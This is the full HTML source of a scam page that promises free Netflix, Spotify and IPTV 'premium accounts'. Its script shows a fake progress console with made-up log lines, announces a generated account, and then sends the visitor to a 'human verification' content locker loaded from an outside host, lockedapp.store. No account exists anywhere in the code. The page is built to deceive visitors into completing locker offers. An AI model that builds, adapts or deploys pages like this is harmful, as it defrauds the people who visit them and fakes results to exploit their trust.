<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Access Center | 2025 Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script type="text/javascript" id="ogjs" src="https://lockedapp.store/cl/js/6ndqd7"></script>
    
    <style>
        body { background: #05070a; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .loading-bar { width: 0%; transition: width 3s cubic-bezier(0.1, 0.5, 0.5, 1); }
        .console-text { font-family: 'Courier New', monospace; color: #00ff41; text-align: left; }
        .glow-red { box-shadow: 0 0 30px rgba(229, 9, 20, 0.3); }
        .btn-hover:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-gray-900 via-black to-black">

    <div class="glass max-w-lg w-full p-8 rounded-[2.5rem] text-center relative overflow-hidden glow-red">
        <div id="main-content">
            <div class="mb-6">
                <h1 class="text-4xl font-black italic tracking-tighter uppercase">Premium<span class="text-red-600">Hub</span></h1>
                <div class="h-1 w-20 bg-red-600 mx-auto mt-1 rounded-full"></div>
            </div>
            
            <p class="text-gray-400 text-sm mb-8 font-medium">Select a platform to generate your premium access</p>

            <div id="selection-zone" class="space-y-4">
                <button onclick="startProcess('Netflix', '#e50914')" class="glass btn-hover w-full p-5 rounded-2xl flex justify-between items-center border-l-8 border-red-600 group transition-all">
                    <div class="text-left">
                        <span class="block font-bold text-lg group-hover:text-red-500">Netflix Premium</span>
                        <span class="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Ultra HD + 4K / 2025</span>
                    </div>
                    <span class="bg-red-600 text-white text-[10px] px-3 py-1 rounded-full font-black italic">GENERATE</span>
                </button>

                <button onclick="startProcess('Spotify', '#1DB954')" class="glass btn-hover w-full p-5 rounded-2xl flex justify-between items-center border-l-8 border-green-500 group transition-all">
                    <div class="text-left">
                        <span class="block font-bold text-lg group-hover:text-green-500">Spotify Family</span>
                        <span class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Premium / No Ads</span>
                    </div>
                    <span class="bg-green-600 text-white text-[10px] px-3 py-1 rounded-full font-black italic">GENERATE</span>
                </button>

                <button onclick="startProcess('IPTV', '#007bff')" class="glass btn-hover w-full p-5 rounded-2xl flex justify-between items-center border-l-8 border-blue-500 group transition-all">
                    <div class="text-left">
                        <span class="block font-bold text-lg group-hover:text-blue-500">IPTV 12 Months</span>
                        <span class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Platinum / 4K Channels</span>
                    </div>
                    <span class="bg-blue-600 text-white text-[10px] px-3 py-1 rounded-full font-black italic">GENERATE</span>
                </button>
            </div>

            <div id="loader-zone" class="hidden py-10">
                <p id="loading-status" class="text-xs text-yellow-500 mb-3 animate-pulse">Connecting to secure server...</p>
                <div class="mb-6 h-1.5 bg-gray-900 rounded-full overflow-hidden">
                    <div id="progress-bar" class="loading-bar h-full shadow-[0_0_15px_rgba(229,9,20,0.8)]"></div>
                </div>
                <div id="console-box" class="glass bg-black/80 p-5 rounded-2xl text-[10px] h-44 overflow-y-auto console-text border border-white/5">
                    </div>
            </div>

            <div id="verify-zone" class="hidden py-6 animate-[bounce_2s_infinite]">
                <div class="bg-green-600/10 border border-green-600/30 text-green-500 p-4 rounded-2xl mb-8 text-sm font-bold">
                    âœ… Account Generated Successfully!
                    <span class="block text-[10px] text-gray-400 font-normal mt-1 italic">Complete human verification to reveal data</span>
                </div>
                <button onclick="callLocker()" class="w-full py-5 bg-red-600 hover:bg-red-700 text-white rounded-full font-black text-xl shadow-[0_10px_40px_rgba(229,9,20,0.4)] transition-all">
                    UNLOCK ACCESS NOW
                </button>
            </div>
        </div>
    </div>

    <script>
        const logs = [
            "Initializing handshake...",
            "Searching for available account ID...",
            "Database connection established.",
            "Account found: [PRM-2025-ACTIVE]",
            "Injecting license key...",
            "Verifying local IP security...",
            "Finalizing encryption layers...",
            "Verification required: Status [PENDING]"
        ];

        function startProcess(platform, color) {
            document.getElementById('selection-zone').classList.add('hidden');
            document.getElementById('loader-zone').classList.remove('hidden');
            document.getElementById('progress-bar').style.backgroundColor = color;
            document.getElementById('progress-bar').style.width = '100%';

            let i = 0;
            const logInterval = setInterval(() => {
                if (i < logs.length) {
                    const line = document.createElement('p');
                    line.className = "mb-1";
                    line.innerHTML = `<span style="color:#555">[${new Date().toLocaleTimeString()}]</span> > ${logs[i]}`;
                    document.getElementById('console-box').appendChild(line);
                    document.getElementById('console-box').scrollTop = document.getElementById('console-box').scrollHeight;
                    document.getElementById('loading-status').innerText = logs[i];
                    i++;
                } else {
                    clearInterval(logInterval);
                    setTimeout(() => {
                        document.getElementById('loader-zone').classList.add('hidden');
                        document.getElementById('verify-zone').classList.remove('hidden');
                    }, 800);
                }
            }, 700);
        }

        function callLocker() {
            if (typeof og_load === 'function') {
                og_load(); 
            } else {
                window.location.href = "https://lockedapp.store/cl/i/6ndqd7";
            }
        }
    </script>
</body>
</html>
